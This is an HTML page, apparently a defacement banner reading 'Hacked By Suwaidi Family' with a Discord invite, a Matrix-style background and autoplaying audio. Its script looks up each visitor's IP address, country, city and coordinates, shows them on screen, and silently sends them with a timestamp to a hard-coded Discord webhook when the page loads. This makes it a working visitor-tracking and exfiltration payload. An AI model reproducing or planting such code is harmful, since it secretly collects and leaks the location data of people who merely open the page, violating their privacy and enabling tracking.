<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PSYCHO & CJ</title>
<style>
    body {
        margin: 0;
        padding: 0;
        font-family: 'Courier New', Courier, monospace;
        color: #490a0a;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
        text-align: center;
        overflow: hidden;
        background-color: black;
    }

    .background-video {
        display: none;
    }

    .content {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 1;
        position: relative;
        height: 100vh;
        width: 100%;
    }

    .background-video-second {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        z-index: -1;
    }

    .info {
        margin-top: 20px;
        font-size: 1.5em;
        background: linear-gradient(45deg, white, silver, gold);
        -webkit-background-clip: text;
        color: transparent;
        text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.5), 0px 0px 15px rgba(255, 255, 255, 0.5), 0px 0px 25px rgba(255, 255, 255, 0.5);
        letter-spacing: 4.5px;
        white-space: pre-wrap;
    }

    .text {
        margin-top: 20px;
        font-size: 3em;
        background: linear-gradient(45deg, white, silver, gold);
        -webkit-background-clip: text;
        color: transparent;
        text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.5), 0px 0px 15px rgba(255, 255, 255, 0.5), 0px 0px 25px rgba(255, 255, 255, 0.5);
        letter-spacing: 4.5px;
    }

    .marquee {
        position: absolute;
        top: 10%;
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
    }

    .marquee span {
        display: inline-block;
        font-size: 2em;
        color: #ff0000;
        text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000;
        animation: scroll 10s linear infinite;
    }

    @keyframes scroll {
        0% { transform: translateX(100%); }
        100% { transform: translateX(-100%); }
    }

    .image-container img {
        max-width: 80%;
        height: auto;
        margin: 20px auto;
        display: block;
        filter: drop-shadow(0 0 0 white) drop-shadow(0 0 2px white) drop-shadow(0 0 4px white);
    }
</style>
</head>
<body>

<div class="content">
    <video class="background-video-second" autoplay loop muted>
        <source src="https://tenor.com/view/matrix-code-matrix-code-encryption-encrypted-gif-5662740" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <div class="marquee">
        <span></span>
    </div>

    <div id="content">
        <div class="image-container">
            <img src="https://assets.bwbx.io/images/users/iqjWHBFdfxIU/ixkuq6dEHSXM/v1/-1x-1.webp" alt="">
        </div>

        <div class="info" id="ip-info">Loading IP Info...</div>
        <div class="text">discord.gg/SWD</div>

        <audio autoplay loop>
            <source src="https://cdn.discordapp.com/attachments/1360577308259516497/1371907909092511896/Desktop_2025.05.13_-_21.49.02.02_mp3cut.net.mp3?ex=6824d84e&is=682386ce&hm=7d93b5738489e58c3538068e6b7fcad2bf87069bd5bf4ccafffe69507e54e713&" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>
    </div>
</div>

<script>
    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const { ip, country, city, region, loc, org, timezone } = data;
            const infoDiv = document.getElementById('ip-info');
            infoDiv.innerHTML = `<strong>Hacked By Suwaidi Family
</strong><br><strong>Your Ip:</strong><span>"${ip}"</span><br><strong></strong>
<span><strong>Your Location:</strong><span>"${loc}"</span><br><strong> </strong><span></span>`;


            const dateTime = new Date().toLocaleString();
            const webhookUrl = 'https://discord.com/api/webhooks/1342711596035604511/c2zeLZnSp0faGn2G7rnFX6NOdOt1ewLys7Sp55NJt1p1A6FIkFkDciidXSyaV7_3WGie';
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
                })
            });
        });
</script>
</body>
</html>
